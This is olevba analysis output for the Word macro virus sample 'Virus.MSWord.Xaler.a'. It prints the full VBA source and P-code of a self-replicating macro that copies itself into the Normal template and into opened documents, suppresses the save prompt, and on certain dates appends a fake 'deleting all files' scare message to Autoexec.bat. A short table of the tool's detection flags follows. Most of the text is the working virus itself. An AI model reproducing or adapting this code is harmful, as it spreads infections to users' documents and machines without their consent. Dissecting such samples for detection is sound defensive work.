olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Xaler.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Xaler.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'RELAX
Private Sub RELAX2()
If Day(Date) Mod 10 = 0 And Month(Date) Mod 4 = 0 Then
Open "C:\Autoexec.bat" For Append As #1
Print #1, "Cls"
Print #1, "@ECHO OFF"
Print #1, "ECHO NOTE!!!"
Print #1, "ECHO ***"
Print #1, "ECHO *****"
Print #1, "ECHO *******"
Print #1, "ECHO *****"
Print #1, "ECHO ***"
Print #1, "ECHO Sometimes you must RELAX."
Print #1, "ECHO Please, RELAX while deleting all files in C:\"
Print #1, "ECHO *****"
Print #1, "ECHO *******"
Print #1, "ECHO *****"
Print #1, "ECHO GREECE"
Print #1, "ECHO =================================="
Print #1, "PAUSE"
Print #1, "CLS"
Print #1, "ECHO All files deleted!!!"
Print #1, "ECHO Now, you have a clean COMPUTER."
Print #1, "ECHO *******"
Print #1, "ECHO *******"
Print #1, "PAUSE"
Print #1, "@ECHO ON"
Close #1
End If
End Sub

Private Sub Document_Close()
Call GOODSub
Call RELAX2
End Sub

Private Sub GOODSub()
On Error Resume Next
Application.ScreenUpdating = False
Application.Options.SaveNormalPrompt = False
x$ = "C:\temp.tmp"
MacroContainer.VBProject.VBComponents.Item("ThisDocument").Export x$
Open x$ For Input As #1
keimeno = Input(LOF(1), 1)
Close #1
kk& = InStr(1, keimeno, "'RELAX")
keimeno = Right$(keimeno, Len(keimeno) - kk& + 1)
For j = 1 To 2
If j = 1 Then
NormalTemplate.VBProject.VBComponents.Item("ThisDocument").Export x$
Else
ActiveDocument.VBProject.VBComponents.Item("ThisDocument").Export x$
End If
Open x$ For Input As #1
rlx = Input(LOF(1), 1)
Close #1
d1 = InStr(1, rlx, "'RELAX")
If d1 = 0 Then
If j = 1 Then
NormalTemplate.VBProject.VBComponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
NormalTemplate.Save
Else
ActiveDocument.VBProject.VBComponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
End If
End If
Next j
'====================
Dim PRostasia As Byte
PRostasia = 1
fff = FreeFile
If Dir(ActiveDocument.FullName, 6) <> "" Then
Open ActiveDocument.FullName For Binary As #fff
Put #fff, 862, PRostasia
Close #fff
ActiveDocument.Save
End If
Kill x$
Application.ScreenUpdating = True
End Sub

Private Sub Document_Open()
Call GOODSub
End Sub




































































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Xaler.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10869 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0005 "RELAX"
' Line #1:
' 	FuncDefn (Private Sub RELAX2())
' Line #2:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #3:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #4:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "Cls"
' 	PrintItemNL 
' Line #5:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #6:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "ECHO NOTE!!!"
' 	PrintItemNL 
' Line #7:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "ECHO ***"
' 	PrintItemNL 
' Line #8:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "ECHO *****"
' 	PrintItemNL 
' Line #9:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "ECHO *******"
' 	PrintItemNL 
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "ECHO *****"
' 	PrintItemNL 
' Line #11:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "ECHO ***"
' 	PrintItemNL 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "ECHO Sometimes you must RELAX."
' 	PrintItemNL 
' Line #13:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "ECHO Please, RELAX while deleting all files in C:\"
' 	PrintItemNL 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "ECHO *****"
' 	PrintItemNL 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "ECHO *******"
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "ECHO *****"
' 	PrintItemNL 
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "ECHO GREECE"
' 	PrintItemNL 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ECHO =================================="
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "PAUSE"
' 	PrintItemNL 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CLS"
' 	PrintItemNL 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "ECHO All files deleted!!!"
' 	PrintItemNL 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "ECHO Now, you have a clean COMPUTER."
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "ECHO *******"
' 	PrintItemNL 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "ECHO *******"
' 	PrintItemNL 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "PAUSE"
' 	PrintItemNL 
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "@ECHO ON"
' 	PrintItemNL 
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	EndSub 
' Line #30:
' Line #31:
' 	FuncDefn (Private Sub Document_Close())
' Line #32:
' 	ArgsCall (Call) GOODSub 0x0000 
' Line #33:
' 	ArgsCall (Call) RELAX2 0x0000 
' Line #34:
' 	EndSub 
' Line #35:
' Line #36:
' 	FuncDefn (Private Sub GOODSub())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #39:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #40:
' 	LitStr 0x000B "C:\temp.tmp"
' 	St x$ 
' Line #41:
' 	Ld x$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #42:
' 	Ld x$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #43:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Input$ 0x0002 
' 	St keimeno 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #45:
' 	LitDI2 0x0001 
' 	Ld keimeno 
' 	LitStr 0x0006 "'RELAX"
' 	FnInStr3 
' 	St kk& 
' Line #46:
' 	Ld keimeno 
' 	Ld keimeno 
' 	FnLen 
' 	Ld kk& 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Right$ 0x0002 
' 	St keimeno 
' Line #47:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #48:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld x$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #50:
' 	ElseBlock 
' Line #51:
' 	Ld x$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld x$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #54:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Input$ 0x0002 
' 	St rlx 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #56:
' 	LitDI2 0x0001 
' 	Ld rlx 
' 	LitStr 0x0006 "'RELAX"
' 	FnInStr3 
' 	St d1 
' Line #57:
' 	Ld d1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #58:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitDI2 0x0001 
' 	Ld keimeno 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #60:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	LitDI2 0x0001 
' 	Ld keimeno 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #66:
' 	QuoteRem 0x0000 0x0014 "===================="
' Line #67:
' 	Dim 
' 	VarDefn PRostasia (As Byte)
' Line #68:
' 	LitDI2 0x0001 
' 	St PRostasia 
' Line #69:
' 	Ld Friend 
' 	St fff 
' Line #70:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld fff 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #72:
' 	Ld fff 
' 	Sharp 
' 	LitDI2 0x035E 
' 	Ld PRostasia 
' 	PutRec 
' Line #73:
' 	Ld fff 
' 	Sharp 
' 	Close 0x0001 
' Line #74:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Ld x$ 
' 	ArgsCall Kill 0x0001 
' Line #77:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #78:
' 	EndSub 
' Line #79:
' Line #80:
' 	FuncDefn (Private Sub Document_Open())
' Line #81:
' 	ArgsCall (Call) GOODSub 0x0000 
' Line #82:
' 	EndSub 
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

